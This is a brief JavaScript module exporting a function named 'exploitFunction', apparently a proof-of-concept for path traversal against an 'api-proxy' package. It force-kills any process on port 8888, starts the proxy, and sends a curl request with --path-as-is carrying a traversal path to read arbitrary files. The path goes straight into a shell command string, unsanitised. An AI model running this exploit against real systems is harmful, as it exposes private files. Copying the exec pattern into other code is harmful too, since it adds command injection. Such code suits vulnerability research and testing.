function exploitFunction(payload) {
  const fs = require("fs");
  const { exec } = require("child_process");

  let hostsFile = fs.readFileSync(payload).toString();

  const a = require("child_process");
  try {
    a.execSync("fuser -k 8888/tcp", () => {});
  } catch (e) {}

  require("api-proxy").start(8888);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;
  exec(attack_string, (error, stdout) => {
    return stdout;
  });
}

module.exports = { exploitFunction };